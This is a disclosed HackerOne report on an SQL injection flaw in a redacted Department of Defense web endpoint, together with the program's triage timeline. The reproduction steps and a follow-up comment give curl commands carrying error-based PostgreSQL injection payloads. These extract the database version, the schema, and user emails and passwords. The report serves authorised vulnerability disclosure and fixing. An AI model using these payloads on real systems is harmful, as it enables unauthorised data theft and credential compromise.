---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/sql-injection
  - env/web
  - vuln/sql-injection
  - impact/rce
  - fix/parameterized-query
substate: "resolved"
weakness: "SQL Injection"
enriched: true
body: true
date: 2022-04-07
submitted: 2022-02-23T13:30:42.273Z
bounty_usd: null
votes: 10
cve: []
program: "[[programs/deptofdefense|U.S. Dept Of Defense]]"
reporter: "lubak"
source: "https://hackerone.com/reports/1489744"
title: "SQL Injection in █████"
---
# SQL Injection in █████

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 10 | **Program:** U.S. Dept Of Defense | **Disclosed:** 2022-04-07

- Report: [https://hackerone.com/reports/1489744](https://hackerone.com/reports/1489744)
- CWE: SQL Injection
- Submitted: 2022-02-23T13:30:42.273Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

## References

## Impact

By using SQL injection, an attacker can exfiltrate the whole database, and gain RCE

## System Host(s)
████

## Affected Product(s) and Version(s)
████

## CVE Numbers


## Steps to Reproduce
POC 1 - curl command injecting query, returning database version:
curl https://█████████ -X POST -data="url=%2F████████&███████=AA'+OR(cast(version as date))LIKE'A" -k

POC 2 - curl command injecting query, returning current database:
curl https://███████████████ -X POST -data="url=%2F██████████&███=AA'+OR(cast(current_user as date))LIKE'A" -k
{"msg":"fail","err":"ERROR: invalid input syntax for type timestamp: \"████\""}

POC 3 - curl command injecting query, returning current user:
 curl https://█████████ -X POST -data="url=%2F████&█████=AA'+OR(cast(current_user as date))LIKE'A" -k
{"msg":"fail","err":"ERROR: invalid input syntax for type timestamp: \"███████\""}

## Suggested Mitigation/Remediation Actions
The vulnerable parameter "█████" in the ████████ endpoint should be sanitized properly. Usually this is done by implementing prepared statement.

## Timeline

- **Report Filed**
- **2022-02-23** @U.S. Dept Of Defense: Greetings from the Department of Defense (DoD),

Thank you for supporting the DoD Vulnerability Disclosure Program (VDP).

By submitting this report, you acknowledge understanding of, and agreement to, the DoD Vulnerability Disclosure Policy as detailed at @DeptofDefense.

The VDP Team will review your report to ensure compliance with the DoD Vulnerability Disclosure Policy.  If your report is determined to be out-of-scope, it will be closed without action.

We will attempt to validate in-scope vulnerability reports and may request additional information from you if necessary. We will forward reports with validated vulnerabilities to DoD system owners for their action.

Our goal is to provide you with status updates not less than every two weeks until the reported vulnerability is resolved.

Regards,

The VDP Team
- **2022-02-23** @lubak: Hi,
I forgot to inform you that this report follows my previous report (https://hackerone.com/reports/1489490), where the same end point is exploited to leak admin users PII data using IDOR

Best regards,
lubak
- **Report Severity Updated**
- **Report Triaged**
- **2022-02-23** @agent-0g: @lubak Are you able to dump users and/or passwords?
- **Report Severity Updated**
- **2022-02-23** @lubak: Yes - the vulnerability leads to executing SQL queries by attacker choice, here are steps to reproduce:
POC 1 - retrieve all table names, and contained column names to enumerate database
curl https://██████████ -X POST -data="url=%2F█████████&█████████=AA'+OR(cast((SELECT array_to_string(array(SELECT concat('|table_name:',table_name,' -> column_name:',column_name) FROM information_schema.columns order by table_name),', ')) as date))LIKE'A" -k

The results are displayed in non-readable friendly way, so I'm attaching parsed text file containing the whole database structure in easier to read format

POC 2 - retrieve all email, usernames, password from table █████. Just to mention that the table contains ██████, which I didn't retrieved
curl https://████████ -X POST -data="url=%2F████&██████=AA'+OR(cast((SELECT array_to_string(array(SELECT concat('| ████) FROM ████),', ')) as date))LIKE'A" -k
I'm attaching parsed data.

Another thing to note is that this system is storing ████████t which is TERRIBLE practice

Best regards,
lubak
- **2022-02-23** @agent-0g: @lubak Great work!! I'll adjust the serverity. Nicely done!
- **Report Severity Updated**
- **2022-02-23** @lubak: Thank you for adjusting severity!
- **2022-02-25** @agent-bk1: Because of this ticket, and one other, you are being considered for Researcher of the Month. If selected, how would you like to be referred to? Is there a twitter handle you'd like to use? Would you like your real name mentioned on the certificate that is tweeted out? Please reply to this comment and let me know, thank you.
- **2022-02-25** @lubak: Hi agent-bk1,
That will be a great honor for me! If selected, please refer me with my full name: Lyubomir Margaritov.

Best regards,
lubak
- **2022-02-25** @lubak: And my twitter username is @1ubak, if you like to tag me.
- **2022-03-02** @lubak: Thank you so much for awarding me Researcher of the Month!  I appreciate it!

Best wishes,
lubak
- **Report Resolved**
- **Agreed On Going Public**
- **2022-03-30** @lubak: Just a reminder - If you decide to disclose, please do not forget to remove all attachments containing sensitive data

Best regards,
lubak
- **Agreed On Going Public**
- **Report Became Public**
- **Comments Closed**
